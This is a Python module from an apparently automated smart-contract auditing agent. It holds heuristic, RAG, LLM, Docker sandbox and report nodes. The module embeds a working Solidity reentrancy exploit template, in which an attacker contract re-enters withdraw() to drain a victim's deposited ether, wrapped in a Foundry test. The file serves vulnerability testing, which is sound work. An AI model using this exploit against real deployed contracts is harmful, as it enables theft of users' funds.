"""
Agent 图节点：auditor_node（RAG+PoC）、sandbox_node（沙盒执行）、report_node（最终报告）。
"""

import os
import re
from typing import Any, Dict

# 确保从项目根目录运行时能导入（与 rag_engine 脚本一致）
import sys
from pathlib import Path

_root = Path(__file__).resolve().parent.parent
if str(_root) not in sys.path:
    sys.path.insert(0, str(_root))

try:
    from rag_engine.mock_retriever import mock_retrieve_similar_poc
except Exception:
    mock_retrieve_similar_poc = None


def _get_retriever():
    """优先使用 rag_engine 真实 RAG；未建库或 USE_MOCK_RAG=1 时用 mock。返回 (retriever_func, "chromadb"|"mock")。"""
    if os.environ.get("USE_MOCK_RAG", "").strip().lower() in ("1", "true", "yes"):
        if mock_retrieve_similar_poc is not None:
            return mock_retrieve_similar_poc, "mock"
    try:
        from rag_engine.retriever import retrieve_similar_poc
        return retrieve_similar_poc, "chromadb"
    except Exception:
        pass
    return mock_retrieve_similar_poc, "mock"


def _get_llm():
    """返回 LLM 实例：
    - 若设置 USE_MOCK_LLM_FAST=1，则强制使用本地 deterministic PoC（不走网络）；
    - 否则在有 DEEPSEEK/OPENAI 环境变量时用真实 API。
    """
    if os.environ.get("USE_MOCK_LLM_FAST", "").strip().lower() in ("1", "true", "yes"):
        return None
    api_key = os.environ.get("DEEPSEEK_API_KEY") or os.environ.get("OPENAI_API_KEY")
    if not api_key:
        return None
    try:
        from langchain_openai import ChatOpenAI

        base_url = os.environ.get("DEEPSEEK_API_BASE", "https://api.deepseek.com/v1")
        return ChatOpenAI(
            model=os.environ.get("AUDIT_LLM_MODEL", "deepseek-chat"),
            api_key=api_key,
            base_url=base_url,
            temperature=0.1,
            max_tokens=700,
        )
    except Exception:
        return None


def _extract_first_contract_name(contract_source: str) -> str | None:
    # 兼容 demo 合约：取第一个出现的 `contract X` 名称
    m = re.search(r"\bcontract\s+([A-Za-z_]\w*)\b", contract_source)
    return m.group(1) if m else None


def _analyze_reentrancy_heuristic(contract_source: str) -> tuple[bool, str]:
    """
    非 LLM 情况下的最小启发式：
    - 如果 withdraw() 中外部 call 在 balances[msg.sender]=0 之前 → 更像漏洞版
    - 若存在 nonReentrant 或 Checks-Effects-Interactions 顺序正确 → 更像安全版
    """
    src = contract_source or ""
    has_nonreentrant = "nonReentrant" in src
    idx_withdraw = src.find("function withdraw")
    if idx_withdraw < 0:
        # 看不到 withdraw，保守起见不下结论
        return False, "No withdraw() found; no reentrancy hypothesis."

    # 粗略取 withdraw() 片段（demo 合约足够稳定）
    window = src[idx_withdraw : idx_withdraw + 2000]
    idx_call = window.find(".call{value")
    idx_effect = window.find("balances[msg.sender] = 0")

    if idx_call != -1 and idx_effect != -1 and idx_call < idx_effect and not has_nonreentrant:
        return True, "External call happens before state update in withdraw()."

    return False, "State updated before external call or guarded by nonReentrant."


def _deterministic_reentrancy_poc(contract_name: str) -> str:
    # 该 PoC 会在漏洞版合约上通过（攻击者余额 > 初始存入），在安全版上失败
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Target.sol";

interface ITarget {{
    function deposit() external payable;
    function withdraw() external;
}}

contract ReenterAttacker {{
    ITarget public target;
    uint256 public reenterCount;

    constructor(address _target) {{
        target = ITarget(_target);
    }}

    function attack() external payable {{
        require(msg.value == 1 ether, "need 1 ether");
        target.deposit{{value: 1 ether}}();
        target.withdraw();
    }}

    receive() external payable {{
        // 只在目标仍有余额时重入，避免无限循环
        if (address(target).balance >= 1 ether && reenterCount < 20) {{
            reenterCount++;
            target.withdraw();
        }}
    }}
}}

contract AttackTest is Test {{
    function testExploit() public {{
        // 部署目标合约
        {contract_name} target = new {contract_name}();

        // victim 先存入 10 ether 作为可被盗的资金池
        address victim = makeAddr("victim");
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        target.deposit{{value: 10 ether}}();

        // 攻击者合约发起攻击
        ReenterAttacker attacker = new ReenterAttacker(address(target));
        vm.deal(address(attacker), 1 ether);
        attacker.attack{{value: 1 ether}}();

        console.log("target balance after:", address(target).balance);
        console.log("attacker balance after:", address(attacker).balance);
        console.log("reenterCount:", attacker.reenterCount());

        // 漏洞版：攻击者应获得 > 1 ether；安全版：只能提现回自己的 1 ether（该断言会失败）
        assertGt(address(attacker).balance, 1 ether);
    }}
}}
"""


def auditor_node(state: dict[str, Any]) -> dict[str, Any]:
    """分析合约 → 生成漏洞假设 → 调 RAG → 生成 PoC。"""
    contract_source = state.get("contract_source", "")
    retriever, rag_source = _get_retriever()
    llm = _get_llm()
    log = state.get("status_log") or []

    rag_label = "ChromaDB (real RAG)" if rag_source == "chromadb" else "MockRAG (hardcoded)"
    log.append({"node": "auditor-precheck", "message": "Heuristic agent analyzing withdraw() pattern..."})
    is_vuln, reason = _analyze_reentrancy_heuristic(contract_source)
    if is_vuln:
        vuln_hypothesis = (
            "Reentrancy: contract sends Ether before updating balance, allowing recursive withdraw."
        )
    else:
        vuln_hypothesis = (
            "No confirmed reentrancy: state updated before external call or guarded by nonReentrant."
        )
    log.append({"node": "auditor-precheck", "message": f"Heuristic check result: {reason}"})

    # 若启发式认为当前合约不像典型重入漏洞，则只做轻量级说明，不再调用 RAG/LLM。
    if not is_vuln:
        log.append(
            {
                "node": "auditor",
                "message": "Heuristic agent found no obvious reentrancy; skipping RAG + LLM to keep latency low.",
            }
        )
        rag_context: list[dict] = []
        generated_poc = ""
        return {
            "vuln_hypothesis": vuln_hypothesis,
            "rag_context": rag_context,
            "generated_poc": generated_poc,
            "status_log": log,
            "retry_count": 0,
            "sandbox_history": [],
        }

    # 进入高风险路径：才真正调用 RAG + PoC Agent
    log.append({"node": "auditor", "message": f"Using RAG source: {rag_label}"})
    log.append({"node": "auditor", "message": "RAG agent retrieving similar PoC templates..."})
    rag_context = retriever(vuln_hypothesis, top_k=2) if retriever else []
    log.append({"node": "auditor", "message": f"RAG agent returned {len(rag_context)} template(s)."})

    if llm:
        try:
            from langchain_core.messages import HumanMessage, SystemMessage

            from agent_graph.prompts import AUDITOR_SYSTEM, auditor_user_prompt

            messages = [
                SystemMessage(content=AUDITOR_SYSTEM),
                HumanMessage(content=auditor_user_prompt(contract_source, rag_context)),
            ]
            response = llm.invoke(messages)
            import json

            body = response.content
            if "```json" in body:
                body = body.split("```json")[1].split("```")[0].strip()
            elif "```" in body:
                body = body.split("```")[1].split("```")[0].strip()
            parsed = json.loads(body)
            generated_poc = parsed.get("poc_code", "")
            vuln_hypothesis = parsed.get("attack_mechanism", vuln_hypothesis)
        except Exception as e:
            log.append({"node": "auditor", "message": f"LLM parse error: {e}, using template."})
            contract_name = _extract_first_contract_name(contract_source) or "Target"
            generated_poc = _deterministic_reentrancy_poc(contract_name)
    else:
        log.append({"node": "auditor", "message": "No LLM API key; using deterministic PoC."})
        contract_name = _extract_first_contract_name(contract_source) or "Target"
        generated_poc = _deterministic_reentrancy_poc(contract_name)

    return {
        "vuln_hypothesis": vuln_hypothesis,
        "reentrancy_suspected": is_vuln,
        "rag_context": rag_context,
        "generated_poc": generated_poc,
        "status_log": log,
        "retry_count": 0,
        "sandbox_history": [],
    }


def sandbox_node(state: dict[str, Any]) -> dict[str, Any]:
    """
    沙盒执行节点：
    - 使用 FoundrySandbox 在 Docker 中执行当前 PoC；
    - 不做自动修复，仅返回结构化 ExecutionResult；
    - 自愈逻辑由上层图路由到 LLM 修复节点（可后续补充）。
    """
    from sandbox import FoundrySandbox

    log = state.get("status_log") or []
    generated_poc = state.get("generated_poc") or ""
    contract_source = state.get("contract_source") or ""
    # 快速模式：仅做静态分析 / RAG，不实际跑 Foundry 沙盒
    if os.environ.get("SKIP_SANDBOX", "").strip().lower() in ("1", "true", "yes"):
        log.append(
            {
                "node": "sandbox",
                "message": "Sandbox execution skipped due to SKIP_SANDBOX env flag.",
            }
        )
        return {
            "sandbox_result": {
                "success": False,
                "exit_code": None,
                "stdout": "",
                "stderr": "Sandbox execution skipped (fast mode).",
                "error_type": "skipped",
                "compiler_errors": None,
                "test_summary": None,
                "timed_out": False,
            },
            "status_log": log,
        }

    if not generated_poc:
        log.append({"node": "sandbox", "message": "No generated PoC; skipping sandbox execution."})
        return {"status_log": log}

    log.append({"node": "sandbox", "message": "Running forge test in Docker sandbox..."})

    try:
        sandbox = FoundrySandbox()
        # 这里单次执行；如果你希望 server 端自愈，可以改用 run_with_repair
        result = sandbox.run_once(generated_poc, target_contract_source=contract_source)
        history_entry: Dict[str, Any] = {"poc": generated_poc, "result": result.to_dict()}
        history = (state.get("sandbox_history") or []) + [history_entry]
        log.append(
            {
                "node": "sandbox",
                "message": f"Sandbox finished: success={result.success}, error_type={result.error_type}",
            }
        )
        return {
            "sandbox_result": result.to_dict(),
            "sandbox_history": history,
            "status_log": log,
        }
    except Exception as e:
        log.append({"node": "sandbox", "message": f"Sandbox infra error: {e}"})
        return {
            "sandbox_result": {
                "success": False,
                "exit_code": None,
                "stdout": "",
                "stderr": str(e),
                "error_type": "infra_error",
                "compiler_errors": None,
                "test_summary": None,
                "timed_out": False,
            },
            "status_log": log,
        }


def report_node(state: dict[str, Any]) -> dict[str, Any]:
    """生成最终报告：包含 RAG + 生成 PoC + 沙盒执行结果的摘要。"""
    log = state.get("status_log") or []
    log.append({"node": "report", "message": "Generating final report."})

    sandbox_result = state.get("sandbox_result") or {}
    reentrancy_suspected = state.get("reentrancy_suspected")

    sandbox_success = sandbox_result.get("success")
    sandbox_error_type = sandbox_result.get("error_type")

    # 如果启发式判断当前合约不存在典型重入风险，但 PoC 却"执行成功"，
    # 则在报告层面将其视为"未确认漏洞"，防止误导观众。
    if reentrancy_suspected is False and sandbox_success:
        sandbox_success = False
        sandbox_error_type = "not_confirmed_by_heuristic"
        log.append(
            {
                "node": "report",
                "message": "Heuristic says safe; overriding sandbox_success to False to indicate unconfirmed vulnerability.",
            }
        )

    final_report = {
        "vuln_hypothesis": state.get("vuln_hypothesis"),
        "generated_poc": state.get("generated_poc"),
        "rag_context_count": len(state.get("rag_context") or []),
        "sandbox_success": sandbox_success,
        "sandbox_error_type": sandbox_error_type,
        "sandbox_test_summary": sandbox_result.get("test_summary"),
    }
    return {"final_report": final_report, "status_log": log}

